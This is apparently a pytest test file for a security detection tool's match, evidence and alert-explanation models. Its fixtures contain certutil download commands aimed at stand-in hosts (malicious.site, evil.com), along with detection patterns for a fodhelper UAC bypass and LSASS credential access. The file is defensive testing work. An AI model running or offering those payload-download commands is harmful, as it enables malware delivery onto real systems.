"""Unit tests for DetectionMatch, EvidenceItem, and forensic explanation formatting."""

from __future__ import annotations

import json
from datetime import datetime, timezone

import pytest
from pydantic import ValidationError

from app.models.detection import DetectionMatch, EvidenceItem, generate_explanation


def test_evidence_item_immutability_and_validation() -> None:
    """Verify EvidenceItem correctly records field comparisons and is immutable."""
    item = EvidenceItem(
        field="command_line",
        actual_value="certutil -urlcache -split http://malicious.site/payload.exe",
        matched_pattern="-urlcache",
        modifier="contains",
    )
    assert item.field == "command_line"
    assert item.actual_value == "certutil -urlcache -split http://malicious.site/payload.exe"
    assert item.matched_pattern == "-urlcache"
    assert item.modifier == "contains"

    # Default modifier is exact
    default_item = EvidenceItem(
        field="event_id",
        actual_value=1,
        matched_pattern=1,
    )
    assert default_item.modifier == "exact"

    # Verify immutability (frozen model)
    with pytest.raises(ValidationError):
        item.field = "other_field"  # type: ignore[misc]


def test_detection_match_model_validation() -> None:
    """Verify DetectionMatch requires core provenance fields and enforces types."""
    now = datetime.now(timezone.utc)
    ev = EvidenceItem(field="image", actual_value=r"C:\Windows\System32\certutil.exe", matched_pattern=r"\certutil.exe", modifier="endswith")

    match = DetectionMatch(
        rule_id="WS-SYS-001",
        rule_title="Suspicious Certutil Download",
        severity="high",
        event_id=1,
        event_record_id=1024,
        event_db_id=42,
        computer="VICTIM-PC.corp.local",
        timestamp_utc=now,
        process_guid="{12345678-ABCD-EF01-2345-6789ABCDEF01}",
        user=r"CORP\victim_user",
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil -urlcache -split http://evil.com/a.exe",
        matched_evidence=[ev],
        explanation="Test explanation",
        mitre_tactics=["TA0011"],
        mitre_techniques=["T1105"],
        investigation_steps=["Check parent process", "Inspect network connections"],
    )

    assert match.rule_id == "WS-SYS-001"
    assert match.severity == "high"
    assert match.event_record_id == 1024
    assert match.event_db_id == 42
    assert len(match.matched_evidence) == 1
    assert match.mitre_techniques == ["T1105"]

    # Incomplete instantiation must fail
    with pytest.raises(ValidationError):
        DetectionMatch(  # type: ignore[call-arg]
            rule_id="WS-SYS-001",
            rule_title="Incomplete",
            severity="medium",
        )


def test_generate_explanation_narrative() -> None:
    """Verify generate_explanation constructs detailed human-readable forensic text."""
    ev1 = EvidenceItem(field="image", actual_value=r"C:\Windows\System32\cmd.exe", matched_pattern=r"\cmd.exe", modifier="endswith")
    ev2 = EvidenceItem(field="parent_image", actual_value=r"C:\Windows\System32\fodhelper.exe", matched_pattern=r"\fodhelper.exe", modifier="endswith")

    explanation = generate_explanation(
        rule_id="WS-SYS-004",
        rule_title="UAC Bypass via Fodhelper",
        computer="FINANCE-WORKSTATION",
        evidence=[ev1, ev2],
        exclusions_evaluated=["filter_benign_updater"],
        event_id=1,
        mitre_attack=["T1548.002"],
    )

    assert "WS-SYS-004" in explanation
    assert "UAC Bypass via Fodhelper" in explanation
    assert "FINANCE-WORKSTATION" in explanation
    assert "event 1" in explanation
    assert "image (modifier: endswith) matched '\\cmd.exe' with actual value 'C:\\Windows\\System32\\cmd.exe'" in explanation
    assert "parent_image (modifier: endswith) matched '\\fodhelper.exe' with actual value 'C:\\Windows\\System32\\fodhelper.exe'" in explanation
    assert "MITRE ATT&CK: T1548.002" in explanation
    assert "filter_benign_updater" in explanation
    assert "benign baselines negative" in explanation


def test_to_alert_dict_mapping() -> None:
    """Verify to_alert_dict maps DetectionMatch fields to AlertRepository.create_alert kwargs."""
    now = datetime.now(timezone.utc)
    ev = EvidenceItem(field="image", actual_value="test.exe", matched_pattern="test.exe", modifier="exact")
    match = DetectionMatch(
        rule_id="WS-SYS-010",
        rule_title="Suspicious LSASS GrantedAccess",
        severity="critical",
        event_id=10,
        computer="DC01.corp.local",
        timestamp_utc=now,
        process_guid="{AAAA-BBBB-CCCC-DDDD}",
        user=r"NT AUTHORITY\SYSTEM",
        matched_evidence=[ev],
        explanation="LSASS access opened with mask 0x1010",
        mitre_tactics=["TA0006"],
        mitre_techniques=["T1003.001"],
    )

    alert_dict = match.to_alert_dict()
    assert alert_dict["rule_id"] == "WS-SYS-010"
    assert alert_dict["title"] == "Suspicious LSASS GrantedAccess"
    assert alert_dict["severity"] == "critical"
    assert alert_dict["computer"] == "DC01.corp.local"
    assert alert_dict["user"] == r"NT AUTHORITY\SYSTEM"
    assert alert_dict["process_guid"] == "{AAAA-BBBB-CCCC-DDDD}"
    assert alert_dict["first_seen"] == now
    assert alert_dict["last_seen"] == now
    assert alert_dict["description"] == "LSASS access opened with mask 0x1010"
    assert alert_dict["mitre_tactics"] == ["TA0006"]
    assert alert_dict["mitre_techniques"] == ["T1003.001"]


def test_to_evidence_dicts_mapping() -> None:
    """Verify to_evidence_dicts maps to AlertRepository.link_alert_evidence kwargs."""
    now = datetime.now(timezone.utc)
    ev1 = EvidenceItem(field="image", actual_value="certutil.exe", matched_pattern="certutil.exe", modifier="endswith")
    ev2 = EvidenceItem(field="command_line", actual_value="certutil -split", matched_pattern="-split", modifier="contains")

    match = DetectionMatch(
        rule_id="WS-SYS-001",
        rule_title="Certutil Download",
        severity="high",
        event_id=1,
        event_db_id=88,
        computer="HOST01",
        timestamp_utc=now,
        matched_evidence=[ev1, ev2],
        explanation="Matched certutil with -split",
    )

    # Use match's internal event_db_id
    evidence_dicts = match.to_evidence_dicts(alert_id=15)
    assert len(evidence_dicts) == 1
    ev_row = evidence_dicts[0]
    assert ev_row["alert_id"] == 15
    assert ev_row["event_id"] == 88

    matched_fields = json.loads(ev_row["matched_field"])
    assert matched_fields == ["image", "command_line"]

    matched_values = json.loads(ev_row["matched_value"])
    assert matched_values == ["certutil.exe", "certutil -split"]
    assert ev_row["explanation"] == "Matched certutil with -split"

    # Overriding event_db_id explicitly
    override_dicts = match.to_evidence_dicts(alert_id=15, event_db_id=99)
    assert override_dicts[0]["event_id"] == 99
